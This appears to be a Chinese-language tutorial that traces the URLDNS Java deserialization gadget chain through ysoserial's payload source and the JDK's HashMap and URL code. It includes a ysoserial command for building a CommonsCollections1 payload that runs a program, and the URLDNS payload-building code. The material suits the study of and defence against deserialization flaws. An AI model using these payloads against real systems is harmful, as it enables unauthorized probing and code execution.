前言

p牛的 java安全漫谈中，介绍了URLDNS这个链子是很适合java反序列化入门的

java反序列化工具ysoserial.jar

https://github.com/frohoff/ysoserial

java安全⾥程碑式的⼯具

他的作用就是根据你选择的利用链去生成反序列化数据的工具

使用实例,选择利用链和要执行的命令就行了

java -jar ysoserial.jar CommonsCollections1 calc.exe > payload

利⽤链也叫“gadget chains”，通常称为gadget。它连接的是从触发位置开始到执⾏命令的位置结束，在PHP⾥可能

是 __desctruct 到 eval ；

URLDNS

URLDNS 就是ysoserial中⼀个利⽤链的名字，但准确来说，这个其实不能称作“利⽤链”。因为其参数不

是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次DNS请求。

他适合java反序列化入门是因为

  • 使⽤Java内置的类构造，对第三⽅库没有依赖

  • 在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞

先看看ysoserial中URLDNS中的源码

public class URLDNS implements ObjectPayload<Object> {

        public Object getObject(final String url) throws Exception {

                //Avoid DNS resolution during payload creation
                //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
                URLStreamHandler handler = new SilentURLStreamHandler();

                HashMap ht = new HashMap(); // HashMap that will contain the URL
                URL u = new URL(null, url, handler); // URL to use as the Key
                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

                Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.

                return ht;
        }

        public static void main(final String[] args) throws Exception {
                PayloadRunner.run(URLDNS.class, args);
        }

        /**
         * <p>This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
         * using the serialized object.</p>
         *
         * <b>Potential false negative:</b>
         * <p>If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
         * second resolution.</p>
         */
        static class SilentURLStreamHandler extends URLStreamHandler {

                protected URLConnection openConnection(URL u) throws IOException {
                        return null;
                }

                protected synchronized InetAddress getHostAddress(URL u) {
                        return null;
                }
        }
}

注释里写了链子

 *   Gadget Chain:
 *     HashMap.readObject()
 *       HashMap.putVal()
 *         HashMap.hash()
 *           URL.hashCode()

跟着分析一下,进到HashMap里 看一下readObject()

private void readObject(ObjectInputStream s)
        throws IOException, ClassNotFoundException {

        ObjectInputStream.GetField fields = s.readFields();

        // Read loadFactor (ignore threshold)
        float lf = fields.get("loadFactor", 0.75f);
        if (lf <= 0 || Float.isNaN(lf))
            throw new InvalidObjectException("Illegal load factor: " + lf);

        lf = Math.min(Math.max(0.25f, lf), 4.0f);
        HashMap.UnsafeHolder.putLoadFactor(this, lf);

        reinitialize();

        s.readInt();                // Read and ignore number of buckets
        int mappings = s.readInt(); // Read number of mappings (size)
        if (mappings < 0) {
            throw new InvalidObjectException("Illegal mappings count: " + mappings);
        } else if (mappings == 0) {
            // use defaults
        } else if (mappings > 0) {
            float fc = (float)mappings / lf + 1.0f;
            int cap = ((fc < DEFAULT_INITIAL_CAPACITY) ?
                       DEFAULT_INITIAL_CAPACITY :
                       (fc >= MAXIMUM_CAPACITY) ?
                       MAXIMUM_CAPACITY :
                       tableSizeFor((int)fc));
            float ft = (float)cap * lf;
            threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY) ?
                         (int)ft : Integer.MAX_VALUE);

            // Check Map.Entry[].class since it's the nearest public type to
            // what we're actually creating.
            SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);
            @SuppressWarnings({"rawtypes","unchecked"})
            Node<K,V>[] tab = (Node<K,V>[])new Node[cap];
            table = tab;

            // Read the keys and values, and put the mappings in the HashMap
            for (int i = 0; i < mappings; i++) {
                @SuppressWarnings("unchecked")
                    K key = (K) s.readObject();
                @SuppressWarnings("unchecked")
                    V value = (V) s.readObject();
                putVal(hash(key), key, value, false, false);
            }
        }
    }

继续跟进HashMap.putVal() 到 HashMap.hash()

static final int hash(Object key) {
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
    }

hash()函数，调用了一个key对象的参数，执行了一个key.hashCode()

看链子最后是一个URL.hashCode() ，这里的key对象是URL，

URL u = new URL(null, url, handler); // URL to use as the Key

回去跟进这个URL类，看看其 hashCode ⽅法

    public synchronized int hashCode() {
        if (hashCode != -1)
            return hashCode;

        hashCode = handler.hashCode(this);
        return hashCode;
    }

可以发现这里如果hashCode为-1的时候，他会重新计算hashCode，这时候就执行了一个handler.hashCode(this)

handler 跟一下发现 URLStreamHandler handler 是一个URLStreamHandler对象

继续跟进这个hashCode()

protected int hashCode(URL u) {
        int h = 0;

        // Generate the protocol part.
        String protocol = u.getProtocol();
        if (protocol != null)
            h += protocol.hashCode();

        // Generate the host part.
        InetAddress addr = getHostAddress(u);
        if (addr != null) {
            h += addr.hashCode();
        } else {
            String host = u.getHost();
            if (host != null)
                h += host.toLowerCase().hashCode();
        }

有调用getHostAddress(),跟进看

    synchronized InetAddress getHostAddress() {
        if (hostAddress != null) {
            return hostAddress;
        }

        if (host == null || host.isEmpty()) {
            return null;
        }
        try {
            hostAddress = InetAddress.getByName(host);
        } catch (UnknownHostException | SecurityException ex) {
            return null;
        }
        return hostAddress;
    }

hostAddress = InetAddress.getByName(host); 就是根据主机名去获取IP地址，也就会发送一次DNS请求.。 这差不多就是这条链子的最终目的了。

比较突兀的是如何通过HashMap里的 putVal(hash(key), key, value, false, false);

其中的hash(key)调用key.hashCode()时，如何执行到URL的hashCode

我们看yoserial里面的逻辑

URLStreamHandler handler = new SilentURLStreamHandler();
HashMap ht = new HashMap(); 
URL u = new URL(null, url, handler); // URL to use as the Key// HashMap that will contain the URL
ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

最后是通过ht.put(u, url); 进去看看put函数

public V put(K key, V value) {
        return putVal(hash(key), key, value, false, true);
    }

很神奇的是put(u, url) 的逻辑

正是以u为key，以url为value来执行了putVal(hash(key), key, value, false, true);

成功执行了u.hashCode也就是URL.hashCode
